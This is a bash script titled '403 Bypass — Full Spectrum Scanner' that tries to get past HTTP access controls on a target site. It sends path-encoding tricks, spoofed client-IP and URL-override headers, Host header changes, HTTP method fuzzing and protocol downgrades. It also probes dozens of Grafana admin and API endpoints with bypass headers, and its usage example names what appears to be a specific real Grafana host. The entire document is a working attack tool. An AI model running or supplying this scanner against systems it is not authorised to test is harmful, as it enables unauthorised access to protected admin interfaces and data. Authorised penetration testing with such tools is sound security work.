#!/bin/bash
# ============================================================
# 403 BYPASS — FULL SPECTRUM SCANNER
# Comprehensive 403 bypass tool — headers, paths, methods,
# encoding, protocol tricks, and Grafana-specific vectors.
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

TARGET="${1}"
PATH_TARGET="${2:-}"

if [ -z "$TARGET" ]; then
    echo -e "${RED}Usage: $0 <URL> [path]${NC}"
    echo -e "  Example: $0 https://grafana.rgive.com admin"
    exit 1
fi

# Strip trailing slash from target
TARGET="${TARGET%/}"

echo ""
echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}${BOLD}║          403 BYPASS — FULL SPECTRUM SCANNER             ║${NC}"
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
echo -e "${CYAN}Target: ${TARGET}${NC}"
echo -e "${CYAN}Path:   ${PATH_TARGET:-/}${NC}"
echo ""

RESULTS_FILE="/tmp/bypass_results_$(date +%s).txt"
> "$RESULTS_FILE"

fire() {
    local label="$1"
    local code="$2"
    local size="$3"
    local detail="$4"

    if [[ "$code" == "200" ]]; then
        echo -e "${GREEN}[${code}] [${size}B] ${label} --> ${detail}${NC}"
        echo "[HIT] [${code}] [${size}B] ${label} --> ${detail}" >> "$RESULTS_FILE"
    elif [[ "$code" == "30"* ]]; then
        echo -e "${YELLOW}[${code}] [${size}B] ${label} --> ${detail}${NC}"
        echo "[REDIRECT] [${code}] [${size}B] ${label} --> ${detail}" >> "$RESULTS_FILE"
    elif [[ "$code" == "401" || "$code" == "405" ]]; then
        echo -e "${CYAN}[${code}] [${size}B] ${label} --> ${detail}${NC}"
        echo "[INTERESTING] [${code}] [${size}B] ${label} --> ${detail}" >> "$RESULTS_FILE"
    elif [[ "$code" == "403" ]]; then
        echo -e "${RED}[${code}] [${size}B] ${label} --> ${detail}${NC}"
    else
        echo -e "${YELLOW}[${code}] [${size}B] ${label} --> ${detail}${NC}"
        echo "[OTHER] [${code}] [${size}B] ${label} --> ${detail}" >> "$RESULTS_FILE"
    fi
}

probe() {
    local label="$1"
    shift
    local result
    result=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" --max-time 10 "$@" 2>/dev/null)
    local code="${result%%,*}"
    local size="${result##*,}"
    local detail="$*"
    fire "$label" "$code" "$size" "$detail"
}

# ============================================================
# SECTION 1: BASELINE
# ============================================================
echo -e "\n${BOLD}[1] BASELINE REQUEST${NC}"
echo "────────────────────────────────────────"
probe "Baseline" "${TARGET}/${PATH_TARGET}"

# ============================================================
# SECTION 2: PATH MANIPULATION
# ============================================================
echo -e "\n${BOLD}[2] PATH MANIPULATION${NC}"
echo "────────────────────────────────────────"
probe "Trailing dot" "${TARGET}/${PATH_TARGET}/."
probe "Double dot" "${TARGET}/${PATH_TARGET}/.."
probe "Trailing slash" "${TARGET}/${PATH_TARGET}/"
probe "Double slash" "${TARGET}//${PATH_TARGET}//"
probe "Dot-slash" "${TARGET}/./${PATH_TARGET}/./"
probe "Semicolon" "${TARGET}/${PATH_TARGET};/"
probe "Dot-semicolon" "${TARGET}/${PATH_TARGET}..;/"
probe "Dot-semicolon-slash" "${TARGET}/${PATH_TARGET}..;/"
probe "Hash" "${TARGET}/${PATH_TARGET}#"
probe "Question mark" "${TARGET}/${PATH_TARGET}?"
probe "Wildcard" "${TARGET}/${PATH_TARGET}/*"
probe "Tab encoded" "${TARGET}/${PATH_TARGET}%09"
probe "Space encoded" "${TARGET}/${PATH_TARGET}%20"
probe "Null byte" "${TARGET}/${PATH_TARGET}%00"
probe "CRLF injection" "${TARGET}/${PATH_TARGET}%0d%0a"
probe "Backslash" "${TARGET}/${PATH_TARGET}\\"
probe "Double-dot-encoded" "${TARGET}/%2e/${PATH_TARGET}"
probe "Double-encoded slash" "${TARGET}/%2f${PATH_TARGET}"
probe "Dot prefix" "${TARGET}/.${PATH_TARGET}"
probe "Tilde" "${TARGET}/${PATH_TARGET}~"
probe "Dot-dot-slash prefix" "${TARGET}/../${PATH_TARGET}"
probe "Slash dot dot slash" "${TARGET}/${PATH_TARGET}/../${PATH_TARGET}"
probe "Triple slash" "${TARGET}///${PATH_TARGET}"
probe "Backslash-forward" "${TARGET}\\/${PATH_TARGET}"
probe "URL-encoded dot" "${TARGET}/${PATH_TARGET}%2e"
probe "Full URL-encode slash" "${TARGET}%2f${PATH_TARGET}"
probe "Double-encode percent" "${TARGET}/${PATH_TARGET}%2520"
probe "Unicode dot" "${TARGET}/${PATH_TARGET}%ef%bc%8f"
probe "Path with .html" "${TARGET}/${PATH_TARGET}.html"
probe "Path with .php" "${TARGET}/${PATH_TARGET}.php"
probe "Path with .json" "${TARGET}/${PATH_TARGET}.json"
probe "Path with .js" "${TARGET}/${PATH_TARGET}.js"
probe "Path with .css" "${TARGET}/${PATH_TARGET}.css"
probe "Path with .ico" "${TARGET}/${PATH_TARGET}.ico"
probe "Path with .xml" "${TARGET}/${PATH_TARGET}.xml"
probe "Path with .txt" "${TARGET}/${PATH_TARGET}.txt"
probe "Path with ?anything" "${TARGET}/${PATH_TARGET}/?anything"
probe "Path with ?debug" "${TARGET}/${PATH_TARGET}?debug=true"
probe "Add param" "${TARGET}/${PATH_TARGET}?test=1"

# ============================================================
# SECTION 3: HEADER MANIPULATION
# ============================================================
echo -e "\n${BOLD}[3] HEADER MANIPULATION — IP SPOOFING${NC}"
echo "────────────────────────────────────────"

SPOOF_IPS=("127.0.0.1" "localhost" "0.0.0.0" "10.0.0.1" "172.16.0.1" "192.168.0.1" "192.168.1.1" "::1" "0177.0.0.01" "2130706433" "0x7f000001" "127.0.0.1:80" "127.0.0.1:443")

SPOOF_HEADERS=(
    "X-Forwarded-For"
    "X-Real-IP"
    "X-Custom-IP-Authorization"
    "X-Originating-IP"
    "X-Remote-IP"
    "X-Remote-Addr"
    "X-Client-IP"
    "X-Host"
    "X-Forwarded-Host"
    "X-ProxyUser-Ip"
    "True-Client-IP"
    "Cluster-Client-IP"
    "Fastly-Client-IP"
    "CF-Connecting-IP"
    "X-Azure-ClientIP"
    "X-Original-Forwarded-For"
)

for header in "${SPOOF_HEADERS[@]}"; do
    for ip in "127.0.0.1" "localhost" "0.0.0.0"; do
        probe "${header}: ${ip}" "${TARGET}/${PATH_TARGET}" -H "${header}: ${ip}"
    done
done

echo -e "\n${BOLD}[4] HEADER MANIPULATION — URL OVERRIDE${NC}"
echo "────────────────────────────────────────"
probe "X-Original-URL" "${TARGET}/${PATH_TARGET}" -H "X-Original-URL: /${PATH_TARGET}"
probe "X-Original-URL: /" "${TARGET}/${PATH_TARGET}" -H "X-Original-URL: /"
probe "X-Rewrite-URL" "${TARGET}" -H "X-rewrite-url: /${PATH_TARGET}"
probe "X-Override-URL" "${TARGET}" -H "X-Override-URL: /${PATH_TARGET}"
probe "X-Forwarded-Path" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Path: /"
probe "X-Forwarded-Prefix" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Prefix: /"
probe "X-Forwarded-Proto: https" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Proto: https"
probe "X-Forwarded-Proto: http" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Proto: http"
probe "X-Forwarded-Scheme: http" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Scheme: http"
probe "X-Forwarded-Port: 443" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Port: 443"
probe "X-Forwarded-Port: 80" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Port: 80"
probe "X-Forwarded-Port: 8080" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Port: 8080"
probe "X-Forwarded-Port: 4443" "${TARGET}/${PATH_TARGET}" -H "X-Forwarded-Port: 4443"
probe "Forwarded: for=127.0.0.1" "${TARGET}/${PATH_TARGET}" -H "Forwarded: for=127.0.0.1"
probe "X-ProxyUser-Ip: 127.0.0.1" "${TARGET}/${PATH_TARGET}" -H "X-ProxyUser-Ip: 127.0.0.1"

echo -e "\n${BOLD}[5] HEADER MANIPULATION — HOST${NC}"
echo "────────────────────────────────────────"
probe "Host: localhost" "${TARGET}/${PATH_TARGET}" -H "Host: localhost"
probe "Host: 127.0.0.1" "${TARGET}/${PATH_TARGET}" -H "Host: 127.0.0.1"
probe "Host: internal" "${TARGET}/${PATH_TARGET}" -H "Host: internal"

echo -e "\n${BOLD}[6] HEADER MANIPULATION — REFERER/UA${NC}"
echo "────────────────────────────────────────"
probe "Referer: target" "${TARGET}/${PATH_TARGET}" -H "Referer: ${TARGET}/${PATH_TARGET}"
probe "Referer: Google" "${TARGET}/${PATH_TARGET}" -H "Referer: https://www.google.com/"
probe "UA: Googlebot" "${TARGET}/${PATH_TARGET}" -A "Googlebot/2.1 (+http://www.google.com/bot.html)"
probe "UA: Internal" "${TARGET}/${PATH_TARGET}" -A "Mozilla/5.0 (compatible; internal)"
probe "Content-Type: JSON" "${TARGET}/${PATH_TARGET}" -H "Content-Type: application/json"
probe "Accept: JSON" "${TARGET}/${PATH_TARGET}" -H "Accept: application/json"
probe "Accept: XML" "${TARGET}/${PATH_TARGET}" -H "Accept: application/xml"

# ============================================================
# SECTION 4: HTTP METHOD FUZZING
# ============================================================
echo -e "\n${BOLD}[7] HTTP METHOD FUZZING${NC}"
echo "────────────────────────────────────────"
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT PROPFIND MOVE COPY MKCOL LOCK UNLOCK; do
    probe "${method}" "${TARGET}/${PATH_TARGET}" -X "${method}"
done
probe "Method Override (POST)" "${TARGET}/${PATH_TARGET}" -X POST -H "X-HTTP-Method-Override: GET"
probe "Method Override (PUT)" "${TARGET}/${PATH_TARGET}" -X POST -H "X-HTTP-Method: PUT"
probe "Content-Length:0 POST" "${TARGET}/${PATH_TARGET}" -X POST -H "Content-Length: 0"

# ============================================================
# SECTION 5: PROTOCOL / VERSION TRICKS
# ============================================================
echo -e "\n${BOLD}[8] PROTOCOL TRICKS${NC}"
echo "────────────────────────────────────────"
# HTTP downgrade
probe "HTTP/1.0" "${TARGET}/${PATH_TARGET}" --http1.0
probe "HTTP/1.1" "${TARGET}/${PATH_TARGET}" --http1.1
# HTTP/2 if supported
probe "HTTP/2" "${TARGET}/${PATH_TARGET}" --http2 2>/dev/null

# ============================================================
# SECTION 6: CASE SENSITIVITY
# ============================================================
echo -e "\n${BOLD}[9] CASE SENSITIVITY${NC}"
echo "────────────────────────────────────────"
if [ -n "$PATH_TARGET" ]; then
    upper=$(echo "$PATH_TARGET" | tr '[:lower:]' '[:upper:]')
    first_upper=$(echo "$PATH_TARGET" | sed 's/./\U&/')
    last_upper=$(echo "$PATH_TARGET" | sed 's/\(.*\)\(.\)$/\1\U\2/')
    probe "UPPERCASE" "${TARGET}/${upper}"
    probe "First-Upper" "${TARGET}/${first_upper}"
    probe "Last-Upper" "${TARGET}/${last_upper}"
    # Random case
    random_case=$(echo "$PATH_TARGET" | sed 'y/abcdefghijklmnopqrstuvwxyz/AbCdEfGhIjKlMnOpQrStUvWxYz/')
    probe "Random case" "${TARGET}/${random_case}"
fi

# ============================================================
# SECTION 7: GRAFANA-SPECIFIC PATHS
# ============================================================
echo -e "\n${BOLD}[10] GRAFANA-SPECIFIC ENDPOINTS${NC}"
echo "────────────────────────────────────────"

GRAFANA_PATHS=(
    "login"
    "api/health"
    "api/org"
    "api/orgs"
    "api/admin/stats"
    "api/admin/settings"
    "api/users"
    "api/user"
    "api/datasources"
    "api/dashboards/home"
    "api/dashboards/db"
    "api/search"
    "api/search?query="
    "api/frontend/settings"
    "api/snapshots"
    "api/annotations"
    "api/alerts"
    "api/alert-notifications"
    "api/plugins"
    "api/plugin-proxy"
    "api/live/ws"
    "api/live/push"
    "api/tsdb/query"
    "api/ds/query"
    "api/ruler"
    "api/prometheus/api/v1/rules"
    "api/prometheus/grafana/api/v1/rules"
    "explore"
    "d/"
    "dashboard/new"
    "dashboard/import"
    "admin"
    "admin/users"
    "admin/orgs"
    "admin/settings"
    "admin/plugins"
    "admin/stats"
    "public/build"
    "public/plugins"
    "public/img"
    "public/fonts"
    "public/views/index.html"
    "public/views/error.html"
    "metrics"
    "healthz"
    "robots.txt"
    "favicon.ico"
    ".well-known/openid-configuration"
    "api/login/ping"
    "api/user/preferences"
    "api/user/auth-tokens"
    "api/org/preferences"
    "api/ma/events"
    "api/live/list"
    "api/v1/provisioning/alert-rules"
    "api/access-control/user/actions"
)

for gpath in "${GRAFANA_PATHS[@]}"; do
    probe "Grafana: ${gpath}" "${TARGET}/${gpath}"
done

# ============================================================
# SECTION 8: GRAFANA-SPECIFIC PATHS WITH BYPASS HEADERS
# ============================================================
echo -e "\n${BOLD}[11] GRAFANA PATHS + BYPASS HEADERS${NC}"
echo "────────────────────────────────────────"
KEY_GRAFANA=("login" "api/health" "api/frontend/settings" "api/user" "api/org" "api/datasources" "api/search" "api/dashboards/home" "metrics" "explore" "admin")

for gpath in "${KEY_GRAFANA[@]}"; do
    probe "XFF+${gpath}" "${TARGET}/${gpath}" -H "X-Forwarded-For: 127.0.0.1"
    probe "XCIPA+${gpath}" "${TARGET}/${gpath}" -H "X-Custom-IP-Authorization: 127.0.0.1"
    probe "XRealIP+${gpath}" "${TARGET}/${gpath}" -H "X-Real-IP: 127.0.0.1"
    probe "XOrigURL+${gpath}" "${TARGET}/${gpath}" -H "X-Original-URL: /${gpath}"
    probe "XRewrite+${gpath}" "${TARGET}" -H "X-rewrite-url: /${gpath}"
done

# ============================================================
# SECTION 9: DOUBLE-ENCODE PATH ATTACKS
# ============================================================
echo -e "\n${BOLD}[12] DOUBLE-ENCODE PATH ATTACKS${NC}"
echo "────────────────────────────────────────"
if [ -n "$PATH_TARGET" ]; then
    # Double encode each character
    probe "Double-encode /" "${TARGET}/%252f${PATH_TARGET}"
    probe "Double-encode dot" "${TARGET}/%252e/${PATH_TARGET}"
    probe "URL-encoded path" "${TARGET}/$(python3 -c "import urllib.parse; print(urllib.parse.quote('/${PATH_TARGET}', safe=''))" 2>/dev/null)"
    probe "Double URL-encode" "${TARGET}/$(python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('/${PATH_TARGET}', safe=''), safe=''))" 2>/dev/null)"
fi

# ============================================================
# SECTION 10: WAYBACK MACHINE
# ============================================================
echo -e "\n${BOLD}[13] WAYBACK MACHINE LOOKUP${NC}"
echo "────────────────────────────────────────"
echo -e "${CYAN}Checking Wayback Machine...${NC}"
wb_result=$(curl -s --max-time 10 "https://archive.org/wayback/available?url=${TARGET}/${PATH_TARGET}" 2>/dev/null)
if [ -n "$wb_result" ]; then
    echo "$wb_result" | python3 -m json.tool 2>/dev/null || echo "$wb_result"
fi

# Also check for any snapshots of the domain
echo -e "${CYAN}Checking Wayback CDX for all captured URLs...${NC}"
wb_cdx=$(curl -s --max-time 15 "https://web.archive.org/cdx/search/cdx?url=${TARGET}/*&output=text&fl=original,statuscode&limit=30" 2>/dev/null)
if [ -n "$wb_cdx" ]; then
    echo "$wb_cdx" | head -30
fi

# ============================================================
# RESULTS SUMMARY
# ============================================================
echo ""
echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}${BOLD}║                    RESULTS SUMMARY                      ║${NC}"
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

if [ -s "$RESULTS_FILE" ]; then
    echo -e "${GREEN}${BOLD}=== HITS (200) ===${NC}"
    grep "\[HIT\]" "$RESULTS_FILE" 2>/dev/null || echo "  None"
    echo ""
    echo -e "${YELLOW}${BOLD}=== REDIRECTS (3xx) ===${NC}"
    grep "\[REDIRECT\]" "$RESULTS_FILE" 2>/dev/null || echo "  None"
    echo ""
    echo -e "${CYAN}${BOLD}=== INTERESTING (401/405) ===${NC}"
    grep "\[INTERESTING\]" "$RESULTS_FILE" 2>/dev/null || echo "  None"
    echo ""
    echo -e "${YELLOW}${BOLD}=== OTHER ===${NC}"
    grep "\[OTHER\]" "$RESULTS_FILE" 2>/dev/null || echo "  None"
else
    echo -e "${RED}No bypass found. All requests returned 403.${NC}"
fi

echo ""
echo -e "${CYAN}Full results saved to: ${RESULTS_FILE}${NC}"
echo ""
